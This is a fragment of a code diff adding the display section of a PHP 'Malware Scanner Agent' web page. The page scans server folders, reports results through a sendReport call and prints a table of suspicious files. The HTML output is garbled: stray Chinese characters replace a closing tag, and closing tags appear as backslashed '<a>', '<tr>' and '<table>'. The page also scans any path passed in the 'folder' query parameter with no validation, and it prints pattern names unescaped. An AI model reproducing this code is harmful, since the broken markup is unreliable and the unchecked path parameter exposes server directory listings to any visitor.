+    // Tentukan folder yang akan di-scan
+    if (isset($_GET['folder'])) {
+        $folders_to_scan = [$_GET['folder']];
+    } elseif ($auto_detect_all_websites) {
+        $folders_to_scan = getAllDocumentRoots();
+        if (empty($folders_to_scan)) {
+            $folders_to_scan = [__DIR__];
+        }
+    } else {
+        $folders_to_scan = $scan_folders;
+    }
+    
+    $scan_results = scanMultipleFolders($folders_to_scan, $recursive);
+    $task_id = 'web_' . time();
+    $report_result = sendReport($task_id, $scan_results, $wp_versions); // <-- PASS $wp_versions!
+    
+    echo "<h1>🔍 Malware Scanner Agent - Multi-Folder</h1>";
+    echo "<p>🤖 Agent ID: " . $agent_id . "</p>";
+    echo "<p>📋 Scan Mode: " . ($recursive ? 'Deep Scan (Recursive)' : 'Quick Scan') . "</p>";
+    echo "<p>📁 Folders Scanned:</p><ul>";
+    foreach ($scan_results['scanned_folders'] as $folder) {
+        echo "<li>" . htmlspecialchars($folder) . "</li>";
+    }
+    echo "</ul>";
+    echo "<p>📄 Total Files Scanned: " . $scan_results['files_scanned'] . "</p>";
+    echo "<p>⚠️ Suspicious Files Found: " . count($scan_results['suspicious']) . "</p>";
+    
+    if (count($scan_results['suspicious']) > 0) {
+        echo "<h3>🚨 Suspicious Files:</h3>";
+        echo "<table border='1' cellpadding='5' style='border-collapse:collapse;'>";
+        echo "<tr style='background:#ff5252;'><th>File Path</th><th>Score</th><th>Patterns Detected</th>点心";
+        foreach ($scan_results['suspicious'] as $file) {
+            $bg = $file['score'] >= 100 ? '#ff5252' : ($file['score'] >= 50 ? '#ff9800' : '#ffeb3b');
+            echo "<tr style='background:$bg;color:#000;'>";
+            echo "<td>" . htmlspecialchars($file['file']) . "\\<a>";
+            echo "<td style='text-align:center;'><strong>" . $file['score'] . "</strong>\\<a>";
+            echo "<td>" . implode(', ', $file['patterns']) . "\\<a>";
+            echo "\\<tr>";
+        }
+        echo "\\<table>";
+    } else {
+        echo "<p>✅ No suspicious files found! Server is clean.</p>";
+    }
+    echo "<hr>";
+    echo "<p><a href='?scan=1'>🔄 Scan Again</a> | <a href='?heartbeat=1'>💓 Heartbeat</a></p>";
+} else {
+    echo "<h1>🛡️ Malware Scanner Agent</h1>";
+    echo "<p>🤖 Agent ID: " . $agent_id . "</p>";
+    echo "<p>✅ Status: Active</p>";
+    echo "<p>📁 Current Location: " . __DIR__ . "</p>";
+    echo "<hr>";
+    echo "<h3>📋 Scan Options:</h3>";
+    echo "<ul>";
+    echo "<li><a href='?scan=1'>🔍 Quick Scan (Current Folder)</a></li>";
+    echo "<li><a href='?scan=1&depth=deep'>🔍 Deep Scan (Current Folder + Subfolders)</a></li>";
+    echo "<li><a href='?scan=1&folder=/var/www/html'>🌐 Scan Specific Folder</a></li>";
+    echo "<li><a href='?heartbeat=1'>💓 Heartbeat Check</a></li>";
+    echo "</ul>";
+}
+?>
